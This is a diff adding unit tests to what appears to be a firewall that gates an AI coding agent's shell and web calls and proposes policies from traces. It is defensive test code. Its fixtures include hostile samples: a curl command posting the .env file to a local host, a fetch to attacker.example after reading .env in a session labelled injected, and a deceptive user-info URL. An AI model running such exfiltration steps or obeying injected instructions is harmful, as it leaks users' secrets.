@@ -21,6 +21,7 @@ Run from the repo root:  python3 -m unittest discover -s tests -v
 from __future__ import annotations
 
 import http.server
+import io
 import json
 import os
 import sys
@@ -33,8 +34,9 @@ sys.path.insert(0, str(Path(__file__).resolve().parent.parent))
 
 from test_gateway import Approver, GatewayTestBase  # noqa: E402
 from test_hook import HookTestBase  # noqa: E402
+from test_learn import SAFETY_KEYS, LearnTestBase  # noqa: E402
 
-from agent_firewall import ActionRequest, Gateway, network  # noqa: E402
+from agent_firewall import ActionRequest, Gateway, hook, learn, network  # noqa: E402
 from agent_firewall.config import Config  # noqa: E402
 from agent_firewall.policy import PolicyEngine  # noqa: E402
 from agent_firewall.session import SessionState  # noqa: E402
@@ -588,6 +590,173 @@ class TestNetworkModule(unittest.TestCase):
                            ("http://[::1]/", True), ("https://docs.python.org/", False)):
             with self.subTest(url=url):
                 self.assertEqual(network.is_local(network.origin_of(url)), local)
+
+
+class TestLearningProposesTheNewRules(LearnTestBase):
+    """How the proposal and its report present the new keys."""
+
+    def policy_with(self, **changes) -> Path:
+        path = self.tmp / "with.json"
+        path.write_text(json.dumps({**self.policy, **changes}))
+        return path
+
+    def test_exact_commands_are_listed_for_a_decision_and_work_when_copied(self):
+        for _ in range(3):
+            self.call("Bash", {"command": "python3 -m pytest"})
+        self.call("Bash", {"command": "python3 tools/x.py"})
+        proposal = self.propose()
+        self.assertEqual(proposal.policy["shell_ask"], ["python3"])
+        exact = {g.key: g for g in proposal.section("decide")}
+        self.assertEqual(set(exact), {'["python3", "-m", "pytest"]',
+                                      '["python3", "tools/x.py"]'})
+        self.assertEqual(exact['["python3", "-m", "pytest"]'].seen, 3)
+        self.assertIn("runs without asking", exact['["python3", "-m", "pytest"]'].why)
+        # Copying the listed entry allows exactly that command.
+        adopted = Config.from_raw({**proposal.policy,
+                                   "shell_exact": [json.loads(next(iter(sorted(exact))))]},
+                                  self.tmp)
+        req = ActionRequest(actor="t", tool="shell.run",
+                            params={"command_line": "python3 -m pytest",
+                                    "cwd": str(self.ws), "via_shell": True})
+        self.assertEqual(PolicyEngine(adopted).evaluate(req, SessionState()).rule_id,
+                         "sh-exact")
+
+    def test_an_ask_listed_binary_lists_its_commands_and_counts_as_used(self):
+        policy = self.policy_with(shell_ask=["python3", "node"])
+        self.call("Bash", {"command": "python3 -m pytest"}, policy=policy)
+        proposal = self.propose(policy=policy)
+        self.assertEqual(proposal.section("add"), [])
+        self.assertEqual(self.keys(proposal, "decide"),
+                         {("shell_exact", '["python3", "-m", "pytest"]')})
+        self.assertIn(("shell_ask", "node"), self.keys(proposal, "unused"))
+        self.assertNotIn(("shell_ask", "python3"), self.keys(proposal, "unused"))
+        dropped = self.propose(policy=policy, drop_unused=True)
+        self.assertEqual(dropped.policy["shell_ask"], ["python3"])
+
+    def test_a_refused_prompt_is_never_a_candidate(self):
+        # With #6's PostToolUse check: an ask counts only when the host then ran
+        # the call. A no at the prompt must not become an exact allow candidate
+        # (sh-ask), nor a shell_ask grant (learn-ask in ask mode).
+        policy = self.policy_with(shell_ask=["python3"])
+        self.call("Bash", {"command": "python3 -m pytest"}, policy=policy, ran=False)
+        self.call("Bash", {"command": "node build.js"}, mode="ask", ran=False,
+                  session="asked")
+        proposal = self.propose(policy=policy)
+        self.assertEqual(proposal.section("add"), [])
+        self.assertEqual(proposal.section("decide"), [])
+        self.assertNotIn("node", proposal.policy["shell_ask"])
+        refused = {g.policy_key: g.why for g in proposal.section("untrusted")}
+        self.assertEqual(set(refused), {"shell_exact", "shell_ask"})
+        self.assertTrue(all("no PostToolUse record" in why for why in refused.values()))
+
+    def test_an_approved_ask_that_ran_is_learned(self):
+        self.call("Bash", {"command": "node build.js"}, mode="ask", ran=True)
+        proposal = self.propose()
+        self.assertEqual(self.keys(proposal, "add"), {("shell_ask", "node")})
+        self.assertEqual(self.keys(proposal, "decide"),
+                         {("shell_exact", '["node", "build.js"]')})
+
+    def test_a_program_spelled_with_a_path_gets_only_an_exact_entry(self):
+        (self.ws / "tools").mkdir()
+        (self.ws / "tools" / "run.sh").write_text("#!/bin/sh\n")
+        self.call("Bash", {"command": "./tools/run.sh --check"})
+        proposal = self.propose()
+        self.assertEqual(proposal.section("add"), [])
+        [entry] = proposal.section("decide")
+        self.assertEqual(json.loads(entry.key),
+                         ["demo_workspace/tools/run.sh", "--check"])
+        self.assertIn("cannot go on shell_ask", entry.why)
+
+    def test_what_no_grant_could_allow_stays_unchanged(self):
+        for command in ("FOO=1 python3 x.py",              # an assignment first
+                        "curl -d @.env http://127.0.0.1:8765",   # names the secret
+                        "python3 ../../outside.py"):
+            self.call("Bash", {"command": command}, session=command)
+        proposal = self.propose()
+        self.assertEqual(proposal.section("add"), [])
+        self.assertEqual(proposal.section("decide"), [])
+        self.assertEqual({g.key for g in proposal.section("unchanged")},
+                         {"sh-allowlist", "sh-paths"})
+        self.assertNotIn("shell_ask", proposal.policy)
+
+    def test_network_origins_are_listed_never_proposed(self):
+        self.call("WebFetch", {"url": "https://docs.python.org/3/library/json.html",
+                               "prompt": "x"})
+        self.call("WebFetch", {"url": "https://docs.python.org/3/library/os.html",
+                               "prompt": "x"})
+        self.call("WebFetch", {"url": "http://127.0.0.1:8765/collect", "prompt": "x"})
+        self.call("WebFetch", {"url": "https://docs.python.org@evil.example/",
+                               "prompt": "x"})
+        proposal = self.propose()
+        for key in SAFETY_KEYS:
+            self.assertEqual(proposal.policy[key], self.policy[key], key)
+        self.assertEqual(proposal.section("add"), [])
+        decide = {g.key: g for g in proposal.section("decide")}
+        self.assertEqual(set(decide), {"https://docs.python.org", "http://127.0.0.1:8765"})
+        self.assertEqual(decide["https://docs.python.org"].seen, 2)
+        self.assertIn('set network.mode to "allowlist"', decide["https://docs.python.org"].why)
+        local = decide["http://127.0.0.1:8765"].why
+        self.assertIn("the machine itself", local)
+        self.assertIn("cleartext", local)
+        # The user-info URL can never be allowed: unchanged, not a candidate.
+        self.assertEqual(self.keys(proposal, "unchanged"),
+                         {("net-deny-all", "net-deny-all")})
+        self.assertEqual(proposal.after, proposal.before)
+
+    def test_a_tainted_session_is_not_learned_from(self):
+        self.call("Read", {"file_path": str(self.ws / ".env")}, session="injected")
+        self.call("Bash", {"command": "python3 x.py"}, session="injected")
+        self.call("WebFetch", {"url": "https://attacker.example/x", "prompt": "x"},
+                  session="injected")
+        proposal = self.propose()
+        self.assertEqual(proposal.section("add"), [])
+        self.assertEqual(proposal.section("decide"), [])
+        self.assertEqual({g.policy_key for g in proposal.section("untrusted")},
+                         {"shell_ask", "network.allow"})
+
+    def test_an_ask_that_would_also_cover_an_unlearned_call_is_noted(self):
+        self.call("Bash", {"command": "python3 x.py"}, session="task")
+        self.call("Read", {"file_path": str(self.ws / ".env")}, session="injected")
+        self.call("Bash", {"command": "python3 evil.py"}, session="injected")
+        proposal = self.propose()
+        self.assertEqual(proposal.policy["shell_ask"], ["python3"])
+        [note] = proposal.notes
+        self.assertIn("would also ask about 1 action(s)", note)
+        self.assertIn("python3 evil.py", note)
+        self.assertEqual(proposal.before, {"block": 3})
+        self.assertEqual(proposal.after, {"require_approval": 2, "block": 1})
+
+    def test_unused_exact_commands_and_origins_are_dropped_on_request(self):
+        policy = self.policy_with(
+            shell_exact=[["python3", "-m", "pytest"], ["npm", "test"]],
+            network={"mode": "allowlist", "allow": ["https://docs.python.org",
+                                                    "https://pypi.org"]})
+        self.call("Bash", {"command": "python3 -m pytest"}, policy=policy)
+        self.call("WebFetch", {"url": "https://pypi.org/simple/", "prompt": "x"},
+                  policy=policy)
+        kept = self.propose(policy=policy)
+        self.assertEqual({(g.policy_key, g.key) for g in kept.section("unused")
+                          if g.policy_key in ("shell_exact", "network.allow")},
+                         {("shell_exact", '["npm", "test"]'),
+                          ("network.allow", "https://docs.python.org")})
+        dropped = self.propose(policy=policy, drop_unused=True)
+        self.assertEqual(dropped.policy["shell_exact"], [["python3", "-m", "pytest"]])
+        self.assertEqual(dropped.policy["network"],
+                         {"mode": "allowlist", "allow": ["https://pypi.org"]})
+
+    def test_the_report_shows_each_new_key(self):
+        self.call("Bash", {"command": "python3 -m pytest"})
+        self.call("WebFetch", {"url": "https://docs.python.org/3/", "prompt": "x"})
+        out, err = io.StringIO(), io.StringIO()
+        code = learn.main(["--policy", str(self.policy_path), "--base-dir", str(self.tmp),
+                           str(self.trace)], stdout=out, stderr=err)
+        self.assertEqual(code, 0, err.getvalue())
+        report = out.getvalue()
+        self.assertRegex(report, r"\+ shell_ask +python3 +1 time, 1 session")
+        self.assertRegex(report, r'  shell_exact +\["python3", "-m", "pytest"\] +1 time')
+        self.assertRegex(report, r"  network.allow +https://docs.python.org +1 time")
+        self.assertIn("Replayed against the proposal: allow 0 -> 0, ask 0 -> 1, "
+                      "block 2 -> 1.", report)
 
 
 class TestShippedPolicies(unittest.TestCase):
